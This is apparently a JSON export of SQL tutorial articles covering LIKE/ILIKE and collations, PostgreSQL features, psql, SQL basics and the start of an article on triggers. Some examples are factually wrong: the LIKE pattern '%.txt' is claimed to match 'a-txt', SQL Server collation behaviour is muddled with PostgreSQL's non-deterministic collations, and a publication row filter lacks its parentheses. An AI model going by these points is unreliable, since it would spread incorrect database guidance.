COLLATE Latin1_General_CS_AS);\n-- ✅ Index works reliably\n```\n\n### What is Non-Deterministic Collation?\n\nNon-deterministic collation may produce different results based on context, locale, or linguistic rules.\n\n```sql\n-- Non-deterministic collation (SQL Server 2019+)\nSELECT * FROM users \nWHERE name = 'Müller' COLLATE Latin1_General_100_CI_AS_SC_UTF8;\n-- May match: 'Mueller' (ü = ue in German)\n-- Context-dependent linguistic matching\n\n-- Cannot be used for indexes in some databases\nCREATE INDEX idx_name ON users(name COLLATE Latin1_General_100_CI_AS_SC_UTF8);\n-- ❌ Error: Cannot create index on non-deterministic collation\n```\n\n### How They Affect LIKE/ILIKE\n\n```sql\n-- DETERMINISTIC COLLATION\n-- Predictable behavior\nSELECT * FROM products \nWHERE name LIKE 'café%' COLLATE Latin1_General_CS_AS;\n-- Matches: 'café', 'caféine'\n-- Does NOT match: 'Café', 'CAFÉ', 'cafe'\n-- Always the same results\n\n-- NON-DETERMINISTIC COLLATION\n-- Context-dependent behavior\nSELECT * FROM products \nWHERE name LIKE 'café%' COLLATE Latin1_General_100_CI_AI_SC_UTF8;\n-- May match: 'café', 'cafe', 'Café', 'CAFE'\n-- Accent-insensitive, case-insensitive\n-- Results depend on linguistic rules\n```\n\n## Practical Examples\n\n### Example 1: User Search Feature\n\n```sql\n-- PostgreSQL: Case-insensitive search\nSELECT * FROM users \nWHERE \n  name ILIKE '%john%' OR \n  email ILIKE '%john%';\n-- Finds: John, JOHN, john, Johnson\n\n-- SQL Server: Case-insensitive with collation\nSELECT * FROM users \nWHERE \n  name LIKE '%john%' COLLATE Latin1_General_CI_AS OR \n  email LIKE '%john%' COLLATE Latin1_General_CI_AS;\n\n-- MySQL: Often case-insensitive by default\nSELECT * FROM users \nWHERE \n  name LIKE '%john%' OR \n  email LIKE '%john%';\n```\n\n### Example 2: Product Filtering\n\n```sql\n-- Case-sensitive product codes\nSELECT * FROM products \nWHERE code LIKE 'ABC-%';\n-- Matches: 'ABC-001', 'ABC-XYZ'\n-- Does NOT match: 'abc-001'\n\n-- Case-insensitive product names\nSELECT * FROM products \nWHERE name ILIKE '%laptop%';\n-- Matches: 'Laptop', 'LAPTOP', 'Gaming Laptop'\n```\n\n### Example 3: International Names\n\n```sql\n-- Deterministic: Exact matching\nSELECT * FROM customers \nWHERE name LIKE 'José%' COLLATE Latin1_General_CS_AS;\n-- Matches: 'José Garcia'\n-- Does NOT match: 'Jose Garcia', 'josé garcia'\n\n-- Non-deterministic: Flexible matching\nSELECT * FROM customers \nWHERE name LIKE 'Jose%' COLLATE Latin1_General_100_CI_AI_SC;\n-- Matches: 'José Garcia', 'Jose Garcia', 'JOSÉ GARCIA'\n-- Accent-insensitive, case-insensitive\n```\n\n### Example 4: Performance Optimization\n\n```sql\n-- ❌ Slow: Function on column\nSELECT * FROM users \nWHERE LOWER(name) LIKE '%john%';\n-- Can't use index on 'name'\n\n-- ✅ Better: Functional index\nCREATE INDEX idx_name_lower ON users(LOWER(name));\nSELECT * FROM users \nWHERE LOWER(name) LIKE '%john%';\n-- Uses functional index\n\n-- ✅ Best: Native ILIKE with GIN index (PostgreSQL)\nCREATE INDEX idx_name_trgm ON users USING gin(name gin_trgm_ops);\nSELECT * FROM users \nWHERE name ILIKE '%john%';\n-- Uses trigram index, fastest\n```\n\n### Example 5: Escaping Special Characters\n\n```sql\n-- Matching literal wildcards\nSELECT * FROM files \nWHERE filename LIKE '%.txt';\n-- Matches: 'any.txt', 'document.txt', 'a-txt' (. is not special)\n\nSELECT * FROM files \nWHERE filename LIKE '%\\_%' ESCAPE '\\';\n-- Matches: 'my_file.txt', 'data_2024.csv'\n-- Literal underscore, not wildcard\n\nSELECT * FROM discount_codes \nWHERE code LIKE '50\\%OFF' ESCAPE '\\';\n-- Matches: '50%OFF' (literal percent sign)\n```\n\n## Collation Quick Reference\n\n```sql\n-- Common SQL Server collations\nLatin1_General_CS_AS     -- Case-Sensitive, Accent-Sensitive\nLatin1_General_CI_AS     -- Case-Insensitive, Accent-Sensitive\nLatin1_General_CI_AI     -- Case-Insensitive, Accent-Insensitive\nLatin1_General_CS_AI     -- Case-Sensitive, Accent-Insensitive\n\n-- Check database collation\n-- SQL Server\nSELECT DATABASEPROPERTYEX('MyDatabase', 'Collation');\n\n-- PostgreSQL\nSHOW LC_COLLATE;\n\n-- MySQL\nSHOW VARIABLES LIKE 'collation%';\n\n-- Set column collation\n-- SQL Server\nCREATE TABLE users (\n  name NVARCHAR(100) COLLATE Latin1_General_CI_AS\n);\n\n-- PostgreSQL\nCREATE TABLE users (\n  name TEXT COLLATE \"en_US\"\n);\n\n-- MySQL\nCREATE TABLE users (\n  name VARCHAR(100) COLLATE utf8mb4_unicode_ci\n);\n```\n\n## Common Pitfalls\n\n- Using ILIKE in non-PostgreSQL databases (syntax error)\n- Not considering performance impact of case-insensitive searches\n- Forgetting to escape wildcards when matching literal `%` or `_`\n- Using non-deterministic collation in indexed columns\n- Mixing collations in joins (causes errors or performance issues)\n- Not understanding default collation of database/table\n\n## Decision Guide\n\n```sql\n-- Use LIKE when:\n✅ Need case-sensitive matching\n✅ Pattern is fixed/known\n✅ Performance critical\n✅ Working with product codes, IDs\n\nExample:\nSELECT * FROM orders WHERE order_id LIKE 'ORD-%';\n\n\n-- Use ILIKE when:\n✅ User-facing search (PostgreSQL)\n✅ Case doesn't matter\n✅ Searching names, descriptions\n✅ PostgreSQL database\n\nExample:\nSELECT * FROM products WHERE name ILIKE '%laptop%';\n\n\n-- Use LOWER() + LIKE when:\n✅ Need portability across databases\n✅ Can't use ILIKE\n✅ Case-insensitive needed\n\nExample:\nSELECT * FROM users WHERE LOWER(email) LIKE LOWER('%@example.com');\n\n\n-- Use Deterministic Collation when:\n✅ Need predictable results\n✅ Need indexable comparisons\n✅ Exact matching required\n\nExample:\nWHERE name = 'Smith' COLLATE Latin1_General_CS_AS\n\n\n-- Use Non-Deterministic Collation when:\n✅ Need linguistic/cultural matching\n✅ Flexible name matching\n✅ Don't need indexes on comparison\n\nExample:\nWHERE name LIKE 'José%' COLLATE Latin1_General_100_CI_AI_SC\n```\n\n## Best Practices\n\n```sql\n-- ✅ Use appropriate index type\n-- PostgreSQL: GIN index for ILIKE with wildcards\nCREATE INDEX idx_name_trgm ON users USING gin(name gin_trgm_ops);\n\n-- PostgreSQL: B-tree on LOWER() for prefix matching\nCREATE INDEX idx_name_lower ON users(LOWER(name));\n\n-- ✅ Be explicit about collation in critical queries\nSELECT * FROM users \nWHERE name LIKE 'John%' COLLATE Latin1_General_CS_AS;\n\n-- ✅ Document collation choices\n-- In schema documentation:\n-- name column uses Latin1_General_CI_AS for case-insensitive user searches\n\n-- ✅ Test with international characters\n-- Test data:\nINSERT INTO users VALUES ('José'), ('Müller'), ('Björk'), ('Łukasz');\n\n-- ✅ Use parameterized queries with wildcards\n-- ❌ SQL injection risk\nquery = f\"SELECT * FROM users WHERE name LIKE '%{user_input}%'\"\n\n-- ✅ Safe\nquery = \"SELECT * FROM users WHERE name LIKE ?\"\nparams = [f\"%{user_input}%\"]\n```\n\n## References\n\n- [PostgreSQL Pattern Matching](https://www.postgresql.org/docs/current/functions-matching.html)\n- [SQL Server Collation](https://docs.microsoft.com/en-us/sql/relational-databases/collations/collation-and-unicode-support)\n- [MySQL Pattern Matching](https://dev.mysql.com/doc/refman/8.0/en/pattern-matching.html)\n- [SQL Standard LIKE](https://www.iso.org/standard/63555.html)\n\n---\n\n## Quick Reference Table\n\n| Feature | LIKE | ILIKE | Deterministic | Non-Deterministic |\n|---------|------|-------|---------------|-------------------|\n| **Case Sensitive** | Yes (usually) | No | Depends | Depends |\n| **Standard SQL** | Yes | No (PostgreSQL) | Yes | No |\n| **Indexable** | Yes | Yes* | Yes | No** |\n| **Performance** | Fast | Slower | Fast | Slower |\n| **Predictable** | Yes | Yes | Yes | No |\n| **Linguistic Rules** | No | No | No | Yes |\n\n*Requires special index (GIN/trigram)\n**Most databases don't allow indexes on non-deterministic collations"
    },
    {
      "id": "swe/backend/databases/sql/postgreSQL",
      "title": "PostgreSQL: Strengths and Weaknesses",
      "path": [
        "swe",
        "backend",
        "databases",
        "sql",
        "postgreSQL"
      ],
      "content": "# PostgreSQL: Strengths and Weaknesses\n\n## Overview\n\nPostgreSQL is an open-source, object-relational database management system (ORDBMS) known for its standards compliance, extensibility, and robust feature set. It's been in active development since 1986 and has evolved into one of the most advanced open-source databases available. PostgreSQL excels at handling complex queries, supporting advanced data types, and maintaining data integrity—making it popular for applications requiring reliability and sophisticated data operations.\n\n---\n\n## Key Strengths\n\n### 1. **ACID Compliance & Data Integrity**\nPostgreSQL strictly enforces ACID properties (Atomicity, Consistency, Isolation, Durability), ensuring reliable transactions even under failure conditions. It supports sophisticated constraint types including foreign keys, check constraints, and exclusion constraints.\n\n```sql\nCREATE TABLE orders (\n    id SERIAL PRIMARY KEY,\n    user_id INT NOT NULL,\n    total DECIMAL(10,2) CHECK (total >= 0),\n    FOREIGN KEY (user_id) REFERENCES users(id)\n);\n```\n\n### 2. **Advanced Data Types**\nBeyond standard types, PostgreSQL natively supports JSON/JSONB, arrays, hstore (key-value), geometric types, network addresses, and UUIDs. You can even create custom types.\n\n```sql\n-- JSONB for flexible schema data\nCREATE TABLE events (\n    id SERIAL PRIMARY KEY,\n    metadata JSONB\n);\n\n-- Query JSON directly\nSELECT * FROM events \nWHERE metadata->>'event_type' = 'click';\n```\n\n### 3. **Powerful Indexing**\nSupports B-tree, Hash, GiST, SP-GiST, GIN, and BRIN indexes. Partial indexes and expression indexes optimize specific query patterns.\n\n```sql\n-- Index only active users\nCREATE INDEX idx_active_users ON users(email) \nWHERE status = 'active';\n\n-- Index for case-insensitive search\nCREATE INDEX idx_lower_username ON users(LOWER(username));\n```\n\n### 4. **Extensibility**\nYou can add custom functions, operators, data types, and even procedural languages (PL/Python, PL/Perl, PL/V8). Extensions like PostGIS (geospatial), pg_trgm (fuzzy text search), and TimescaleDB (time-series) expand capabilities dramatically.\n\n### 5. **Full-Text Search**\nBuilt-in full-text search capabilities without needing external tools like Elasticsearch for many use cases.\n\n```sql\n-- Add tsvector column for search\nALTER TABLE articles ADD COLUMN search_vector tsvector;\n\n-- Search documents\nSELECT * FROM articles \nWHERE search_vector @@ to_tsquery('postgresql & performance');\n```\n\n### 6. **Window Functions & CTEs**\nSupports complex analytical queries with window functions and recursive Common Table Expressions (CTEs).\n\n```sql\n-- Running totals with window functions\nSELECT \n    date,\n    revenue,\n    SUM(revenue) OVER (ORDER BY date) as running_total\nFROM daily_sales;\n```\n\n### 7. **Strong Community & Ecosystem**\nActive development, comprehensive documentation, and widespread adoption mean robust tooling, ORMs (SQLAlchemy, Django ORM, Sequelize), and reliable hosting options.\n\n---\n\n## Key Weaknesses\n\n### 1. **Write Performance at Scale**\nPostgreSQL uses Multi-Version Concurrency Control (MVCC), which creates new row versions on updates rather than in-place updates. This requires periodic VACUUM operations to reclaim space and can lead to table bloat with heavy write workloads.\n\n**Example scenario**: An application updating millions of rows daily might experience degraded performance without proper VACUUM tuning and autovacuum configuration.\n\n### 2. **Replication Complexity**\nWhile PostgreSQL supports streaming replication and logical replication, setting up high-availability clusters is more complex than with databases like MySQL/MariaDB. Read replicas can lag behind the primary under heavy write loads.\n\n### 3. **Memory Usage**\nEach connection spawns a separate process (not a lightweight thread), consuming 5-10MB of memory. Applications with thousands of concurrent connections need connection pooling (PgBouncer, pgpool-II) to avoid exhausting memory.\n\n```bash\n# Connection pooling becomes essential\n# Direct connections: 1000 * 10MB = 10GB RAM\n# With PgBouncer: ~100 connections * 10MB = 1GB RAM\n```\n\n### 4. **No Built-in Sharding**\nHorizontal partitioning exists, but true sharding (distributing data across multiple servers) requires third-party tools like Citus or manual implementation. This makes scaling writes across multiple nodes more challenging than with distributed databases like Cassandra or MongoDB.\n\n### 5. **Learning Curve**\nThe rich feature set means more concepts to learn. Properly tuning configuration parameters (`shared_buffers`, `work_mem`, `effective_cache_size`) requires understanding PostgreSQL internals.\n\n---\n\n## Step-by-Step: Getting Started with PostgreSQL\n\n### Step 1: Installation\n```bash\n# macOS\nbrew install postgresql@16\nbrew services start postgresql@16\n\n# Ubuntu/Debian\nsudo apt install postgresql postgresql-contrib\n```\n\n### Step 2: Create a Database\n```bash\n# Connect as postgres user\npsql postgres\n\n# Create database and user\nCREATE DATABASE myapp_dev;\nCREATE USER myapp_user WITH PASSWORD 'secure_password';\nGRANT ALL PRIVILEGES ON DATABASE myapp_dev TO myapp_user;\n```\n\n### Step 3: Design a Schema\n```sql\n-- Users table\nCREATE TABLE users (\n    id SERIAL PRIMARY KEY,\n    email VARCHAR(255) UNIQUE NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Posts table with foreign key\nCREATE TABLE posts (\n    id SERIAL PRIMARY KEY,\n    user_id INT REFERENCES users(id) ON DELETE CASCADE,\n    title VARCHAR(255) NOT NULL,\n    content TEXT,\n    published_at TIMESTAMP,\n    metadata JSONB\n);\n\n-- Index for common queries\nCREATE INDEX idx_posts_user ON posts(user_id);\nCREATE INDEX idx_posts_published ON posts(published_at) \nWHERE published_at IS NOT NULL;\n```\n\n### Step 4: Insert and Query Data\n```sql\n-- Insert users\nINSERT INTO users (email) VALUES ('alice@example.com');\n\n-- Insert posts with JSON metadata\nINSERT INTO posts (user_id, title, content, metadata)\nVALUES (\n    1, \n    'My First Post',\n    'Hello world!',\n    '{\"tags\": [\"intro\", \"first\"], \"views\": 0}'::jsonb\n);\n\n-- Query with JSON filtering\nSELECT title, metadata->>'tags' as tags\nFROM posts\nWHERE metadata->'views' > '100'::jsonb;\n```\n\n### Step 5: Optimize with EXPLAIN\n```sql\n-- Analyze query performance\nEXPLAIN ANALYZE\nSELECT u.email, COUNT(p.id) as post_count\nFROM users u\nLEFT JOIN posts p ON u.id = p.user_id\nGROUP BY u.email;\n```\n\n---\n\n## Common Pitfalls\n\n### 1. **Forgetting to Index Foreign Keys**\nPostgreSQL doesn't automatically index foreign key columns. Missing indexes on frequently joined columns kills performance.\n\n```sql\n-- BAD: No index on posts.user_id\n-- GOOD: Explicitly create index\nCREATE INDEX idx_posts_user_id ON posts(user_id);\n```\n\n### 2. **Over-indexing**\nEvery index slows down writes and consumes disk space. Index only what you query frequently.\n\n### 3. **Not Tuning Configuration**\nDefault settings are conservative. For production, tune based on available RAM:\n```conf\nshared_buffers = 25% of RAM\neffective_cache_size = 75% of RAM\nwork_mem = RAM / max_connections / 4\n```\n\n### 4. **Ignoring VACUUM and ANALYZE**\nHeavy update/delete workloads create dead tuples. Monitor table bloat and ensure autovacuum is running efficiently.\n\n```sql\n-- Check table bloat\nSELECT schemaname, tablename, \n       pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename))\nFROM pg_tables WHERE schemaname = 'public';\n```\n\n### 5. **Using TEXT for Everything**\nWhile PostgreSQL handles variable-length fields well, using appropriate types (`VARCHAR(n)`, `INT`, `TIMESTAMP`) enables better validation and optimization.\n\n---\n\n## Practical Applications\n\n**1. SaaS Applications**: PostgreSQL's row-level security and schema isolation make it ideal for multi-tenant applications.\n\n**2. Geospatial Services**: With PostGIS extension, you can build location-based services (think Uber's driver matching or real estate search).\n\n**3. Financial Systems**: ACID compliance and transaction support ensure data consistency for banking, accounting, and e-commerce platforms.\n\n**4. Analytics Platforms**: Window functions, materialized views, and JSON support enable complex analytics without moving data to warehouses for many use cases.\n\n**5. Content Management**: Full-text search and JSONB make PostgreSQL perfect for CMS platforms requiring flexible schemas and search capabilities.\n\n---\n\n## References\n\n1. **Official PostgreSQL Documentation** - [https://www.postgresql.org/docs/](https://www.postgresql.org/docs/) - Comprehensive reference for all features and SQL syntax\n\n2. **PostgreSQL Wiki: Performance Optimization** - [https://wiki.postgresql.org/wiki/Performance_Optimization](https://wiki.postgresql.org/wiki/Performance_Optimization) - Best practices for tuning and scaling\n\n3. **\"PostgreSQL: Up and Running\" by Regina Obe & Leo Hsu** - O'Reilly book covering fundamentals through advanced topics with practical examples\n\n---\n\n## Greater Detail: Advanced Concepts\n\n### Partitioning for Performance\n\nPostgreSQL 10+ supports declarative table partitioning, crucial for managing large datasets by dividing tables into smaller, more manageable pieces.\n\n```sql\n-- Range partitioning by date\nCREATE TABLE measurements (\n    id SERIAL,\n    sensor_id INT,\n    temperature DECIMAL,\n    recorded_at TIMESTAMP NOT NULL\n) PARTITION BY RANGE (recorded_at);\n\n-- Create partitions for each month\nCREATE TABLE measurements_2024_01 \nPARTITION OF measurements\nFOR VALUES FROM ('2024-01-01') TO ('2024-02-01');\n\nCREATE TABLE measurements_2024_02 \nPARTITION OF measurements\nFOR VALUES FROM ('2024-02-01') TO ('2024-03-01');\n\n-- Queries automatically route to correct partition\nSELECT AVG(temperature) FROM measurements\nWHERE recorded_at BETWEEN '2024-01-15' AND '2024-01-20';\n```\n\n**Benefits**: Queries scan only relevant partitions, dropping old data is instant (`DROP TABLE` instead of slow `DELETE`), and indexes remain smaller per partition.\n\n### Advanced Transaction Isolation\n\nPostgreSQL supports four isolation levels, but most use Read Committed (default) or Serializable. Understanding isolation prevents race conditions.\n\n```sql\n-- Serializable isolation prevents lost updates\nBEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;\n\nSELECT balance FROM accounts WHERE id = 1; -- balance = 1000\n\n-- Another transaction might update concurrently\n-- With serializable, this will fail if conflict detected\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\n\nCOMMIT; -- Succeeds or rolls back if conflict\n```\n\n**Real-world example**: A ticketing system preventing overselling. Two users buying the last ticket simultaneously—serializable isolation ensures only one succeeds.\n\n### Lateral Joins and Subquery Optimization\n\n`LATERAL` allows subqueries to reference columns from preceding tables, enabling top-N-per-group queries efficiently.\n\n```sql\n-- Get the 3 most recent posts per user\nSELECT u.email, p.title, p.created_at\nFROM users u\nLEFT JOIN LATERAL (\n    SELECT title, created_at\n    FROM posts\n    WHERE user_id = u.id\n    ORDER BY created_at DESC\n    LIMIT 3\n) p ON true;\n```\n\nWithout `LATERAL`, this requires window functions or less efficient approaches.\n\n### Materialized Views with Concurrent Refresh\n\nMaterialize complex query results for fast reads, refreshing asynchronously.\n\n```sql\n-- Expensive aggregation query\nCREATE MATERIALIZED VIEW user_stats AS\nSELECT \n    u.id,\n    u.email,\n    COUNT(p.id) as post_count,\n    MAX(p.created_at) as last_post_at\nFROM users u\nLEFT JOIN posts p ON u.id = p.user_id\nGROUP BY u.id, u.email;\n\n-- Create index on materialized view\nCREATE INDEX idx_user_stats_post_count ON user_stats(post_count);\n\n-- Refresh without locking reads\nREFRESH MATERIALIZED VIEW CONCURRENTLY user_stats;\n```\n\n**Use case**: Dashboards displaying user activity metrics—refresh hourly rather than computing on every page load.\n\n### Logical Replication for Selective Sync\n\nUnlike physical replication (entire database), logical replication allows publishing specific tables or even filtered rows to subscribers.\n\n```sql\n-- On publisher database\nCREATE PUBLICATION active_users_pub FOR TABLE users\nWHERE status = 'active';\n\n-- On subscriber database\nCREATE SUBSCRIPTION active_users_sub\nCONNECTION 'host=primary.example.com dbname=maindb user=replicator'\nPUBLICATION active_users_pub;\n```\n\n**Application**: A reporting database that only needs active user data, reducing storage and improving query performance.\n\n### Foreign Data Wrappers (FDW)\n\nQuery external data sources (other PostgreSQL instances, MySQL, MongoDB, CSV files, APIs) as if they're local tables.\n\n```sql\n-- Install postgres_fdw extension\nCREATE EXTENSION postgres_fdw;\n\n-- Connect to remote database\nCREATE SERVER remote_db\nFOREIGN DATA WRAPPER postgres_fdw\nOPTIONS (host 'remote.example.com', dbname 'analytics', port '5432');\n\n-- Map remote table\nCREATE FOREIGN TABLE remote_sales (\n    id INT,\n    amount DECIMAL,\n    sale_date DATE\n) SERVER remote_db OPTIONS (schema_name 'public', table_name 'sales');\n\n-- Join local and remote data\nSELECT u.email, SUM(s.amount)\nFROM users u\nJOIN remote_sales s ON u.id = s.user_id\nGROUP BY u.email;\n```\n\n**Real scenario**: Aggregating sales data from regional databases without ETL pipelines.\n\n### JSONB Performance Techniques\n\nJSONB is binary-encoded, supporting indexing and fast operations. Use GIN indexes for containment queries.\n\n```sql\nCREATE TABLE products (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(255),\n    attributes JSONB\n);\n\n-- GIN index for fast JSONB queries\nCREATE INDEX idx_products_attributes ON products USING GIN (attributes);\n\n-- Efficient queries with index support\nSELECT * FROM products\nWHERE attributes @> '{\"color\": \"blue\"}'; -- Contains\n\nSELECT * FROM products\nWHERE attributes ? 'warranty'; -- Key exists\n\n-- Path-based GIN index for specific keys\nCREATE INDEX idx_products_category \nON products USING GIN ((attributes->'category'));\n```\n\n### Connection Pooling Architecture\n\nFor high-concurrency applications, connection pooling is non-negotiable.\n\n```bash\n# PgBouncer configuration example (pgbouncer.ini)\n[databases]\nmyapp = host=localhost dbname=myapp_production\n\n[pgbouncer]\npool_mode = transaction  # or session, statement\nmax_client_conn = 1000\ndefault_pool_size = 25\n```\n\n**Configuration modes**:\n- **Session**: Client holds connection for entire session (safest)\n- **Transaction**: Returns to pool after each transaction (most efficient)\n- **Statement**: Returns after each statement (use cautiously)\n\n### Query Optimization with Statistics\n\nPostgreSQL's query planner relies on statistics. For complex queries, adjust statistics targets.\n\n```sql\n-- Increase statistics detail for frequently filtered columns\nALTER TABLE posts ALTER COLUMN user_id SET STATISTICS 1000;\n\n-- Force statistics update\nANALYZE posts;\n\n-- Review query plan\nEXPLAIN (ANALYZE, BUFFERS)\nSELECT * FROM posts WHERE user_id = 42;\n```\n\nThe planner uses statistics to estimate row counts and choose optimal join strategies. Incorrect statistics lead to poor plans.\n\n---\n\nThese advanced features position PostgreSQL as a database that can grow with your application—from small projects to enterprise-scale systems requiring sophisticated data management, analytics, and integration capabilities."
    },
    {
      "id": "swe/backend/databases/sql/psql",
      "title": "psql: A Well-Structured Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "sql",
        "psql"
      ],
      "content": "# psql: A Well-Structured Overview\n\n**psql** is PostgreSQL's official command-line interface, providing an interactive terminal for executing queries, managing databases, and performing administrative tasks.\n\n## Key Points\n\n- **Definition:** A terminal-based client for PostgreSQL that enables direct database interaction through SQL commands and meta-commands.\n- **Interactive Mode:** Supports command history, tab completion, and multi-line editing for efficient workflows.\n- **Meta-Commands:** Uses backslash commands (e.g., `\\d`, `\\l`) for database inspection without writing SQL.\n- **Scripting Support:** Can execute SQL files and be used in automated scripts with non-interactive mode.\n- **Output Formatting:** Offers multiple display formats (aligned, HTML, CSV, JSON) for query results.\n- **Connection Management:** Connects to local or remote PostgreSQL servers with flexible authentication options.\n- **Built-in Help:** Extensive documentation accessible via `\\?` (meta-commands) and `\\h` (SQL commands).\n\n## Step-by-Step Explanation & Examples\n\n1. **Connecting to a Database**\n   ```bash\n   psql -U username -d database_name -h localhost -p 5432\n   # Or simply:\n   psql database_name\n   ```\n\n2. **Basic Meta-Commands**\n   ```sql\n   \\l                    -- List all databases\n   \\c database_name      -- Connect to a database\n   \\dt                   -- List tables\n   \\d table_name         -- Describe table structure\n   \\du                   -- List users/roles\n   ```\n\n3. **Executing Queries**\n   ```sql\n   SELECT * FROM users WHERE active = true;\n   \n   -- Multi-line queries end with semicolon\n   SELECT id, name, email\n   FROM users\n   WHERE created_at > '2024-01-01';\n   ```\n\n4. **Running SQL Files**\n   ```bash\n   psql -d mydb -f script.sql\n   # Or within psql:\n   \\i /path/to/script.sql\n   ```\n\n5. **Changing Output Format**\n   ```sql\n   \\x                    -- Toggle expanded display (vertical format)\n   \\pset format csv      -- Set CSV output\n   \\o output.txt         -- Redirect output to file\n   ```\n\n## Common Pitfalls\n\n- Forgetting the semicolon to terminate SQL statements, leaving queries \"hanging.\"\n- Confusing meta-commands (backslash) with SQL commands—they have different syntax rules.\n- Not using `\\q` to exit properly, especially in scripts or remote sessions.\n- Overlooking transaction state—an open transaction blocks other operations.\n- Ignoring `.psqlrc` configuration file for customizing the environment.\n\n## Practical Applications\n\n- **Development:** Quick database inspection and ad-hoc query testing during development cycles.\n- **Administration:** User management, backup/restore operations, and performance monitoring.\n- **Data Migration:** Running migration scripts and validating data transformations.\n- **Debugging:** Examining query plans with `EXPLAIN` and investigating production issues.\n\n**Example anecdote:** When debugging a slow API endpoint, you might connect via `psql` and run `EXPLAIN ANALYZE` on the suspected query to identify missing indexes—something that took our team from 8-second responses down to 200ms.\n\n## References\n\n- [PostgreSQL Official Documentation: psql](https://www.postgresql.org/docs/current/app-psql.html)\n- [psql Tips and Tricks](https://www.postgresql.org/docs/current/app-psql.html#APP-PSQL-META-COMMANDS)\n- [psqlrc Configuration Examples](https://www.citusdata.com/blog/2017/07/16/customizing-my-postgres-shell-using-psqlrc/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Variables:** Use `\\set` to define variables (e.g., `\\set myvar 'value'`) and reference with `:myvar`.\n- **Conditional Execution:** Use `\\if`, `\\elif`, `\\else`, `\\endif` for branching logic in scripts.\n- **Timing:** Enable `\\timing` to measure query execution duration for performance analysis.\n- **Watch Mode:** Use `\\watch` to repeatedly execute a query at intervals (useful for monitoring).\n- **Transaction Control:** Leverage `BEGIN`, `COMMIT`, `ROLLBACK` with `\\set AUTOCOMMIT off` for manual transaction management.\n- **Custom Prompts:** Configure `PROMPT1` and `PROMPT2` in `.psqlrc` to show connection info, transaction state, etc.\n- **Connection Strings:** Use URIs (`psql postgresql://user:pass@host:5432/db`) for portable connection configuration.\n- **Editor Integration:** Configure `EDITOR` environment variable to edit queries in your preferred text editor with `\\e`."
    },
    {
      "id": "swe/backend/databases/sql/sql-basics",
      "title": "SQL Basics: A Well-Structured Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "sql",
        "sql-basics"
      ],
      "content": "# SQL Basics: A Well-Structured Overview\n\nSQL (Structured Query Language) is the standard language for managing and querying relational databases. Mastering SQL is essential for software engineers working with data-driven applications.\n\n## Key Points\n\n- **Declarative Language:** SQL describes what data to retrieve, not how to retrieve it.\n- **Core Operations:** CRUD—Create, Read, Update, Delete—are the foundation of SQL.\n- **Tables and Schemas:** Data is organized in tables with defined columns and types.\n- **Joins:** Combine data from multiple tables using INNER, LEFT, RIGHT, and FULL JOINs.\n- **Filtering and Sorting:** Use `WHERE`, `ORDER BY`, and `GROUP BY` to refine results.\n- **Aggregation:** Functions like `COUNT`, `SUM`, `AVG`, `MIN`, and `MAX` summarize data.\n- **Parameterized Queries:** Prevent SQL injection and improve query safety.\n\n## Step-by-Step Explanation & Examples\n\n1. **Selecting Data**\n   ```sql\n   SELECT name, age FROM users WHERE active = true ORDER BY age DESC;\n   ```\n\n2. **Inserting Data**\n   ```sql\n   INSERT INTO users (name, age, active) VALUES ('Ada', 30, true);\n   ```\n\n3. **Updating Data**\n   ```sql\n   UPDATE users SET active = false WHERE age < 18;\n   ```\n\n4. **Deleting Data**\n   ```sql\n   DELETE FROM users WHERE active = false;\n   ```\n\n5. **Joining Tables**\n   ```sql\n   SELECT users.name, orders.amount\n   FROM users\n   INNER JOIN orders ON users.id = orders.user_id;\n   ```\n\n6. **Aggregating Data**\n   ```sql\n   SELECT COUNT(*) FROM users WHERE active = true;\n   ```\n\n## Common Pitfalls\n\n- Forgetting to use `WHERE` in `UPDATE` or `DELETE` (can affect all rows).\n- Not using parameterized queries, risking SQL injection.\n- Misunderstanding join types, leading to missing or duplicate data.\n- Overusing subqueries or complex joins, hurting performance.\n\n## Practical Applications\n\n- Building web and mobile apps with persistent data.\n- Generating reports and analytics.\n- Data migration and ETL (Extract, Transform, Load) processes.\n- Integrating with business intelligence tools.\n\n## References\n\n- [SQL Tutorial (W3Schools)](https://www.w3schools.com/sql/)\n- [PostgreSQL Documentation](https://www.postgresql.org/docs/)\n- [SQLBolt Interactive Lessons](https://sqlbolt.com/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Indexes:** Speed up queries by creating efficient lookup structures.\n- **Transactions:** Ensure data integrity with atomic operations (`BEGIN`, `COMMIT`, `ROLLBACK`).\n- **Views:** Create virtual tables for reusable queries.\n- **Stored Procedures:** Encapsulate logic in the database for reuse and performance.\n- **Normalization/Denormalization:** Organize data to reduce redundancy or optimize for performance.\n- **Window Functions:** Perform advanced analytics"
    },
    {
      "id": "swe/backend/databases/sql-triggers",
      "title": "SQL Triggers: A Well-Structured Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "sql-triggers"
      ],
      "content": "# SQL Triggers: A Well-Structured Overview\n\nSQL triggers are special database objects that automatically execute predefined actions in response to certain events (INSERT, UPDATE, DELETE) on a table. They help enforce business rules, maintain data integrity, and automate workflows.\n\n## Key Points\n\n- **Automatic Execution:** Triggers run in response to table events without explicit calls from application code.\n- **Event Types:** Common trigger events are BEFORE/AFTER INSERT, UPDATE, and DELETE.\n- **Business Logic:** Useful for enforcing rules, auditing changes, or synchronizing tables.\n- **Performance Impact:** Triggers can slow down write operations if overused or poorly designed.\n- **Security:** Can help enforce security policies at the database level.\n- **Visibility:** Triggers are invisible to most application code, which can lead to surprises.\n- **Portability:** Trigger syntax and features vary between database systems (e.g., MySQL, PostgreSQL, SQL Server).\n\n## Step-by-Step Explanation & Examples\n\n1. **Creating a Trigger (PostgreSQL Example)**\n   ```sql\n   CREATE OR REPLACE FUNCTION log_update()\n   RETURNS TRIGGER AS $$\n   BEGIN\n     INSERT INTO audit_log(table_name, action, changed_at)\n     VALUES (TG_TABLE_NAME, TG_OP, NOW());\n     RETURN NEW;\n   END;\n   $$ LANGUAGE plpgsql;\n\n   CREATE TRIGGER user_update_audit\n   AFTER UPDATE ON users\n   FOR EACH ROW EXECUTE FUNCTION log_update();\n   ```\n\n2. **Trigger Events**\n   - BEFORE INSERT: Validate or modify data before it’s 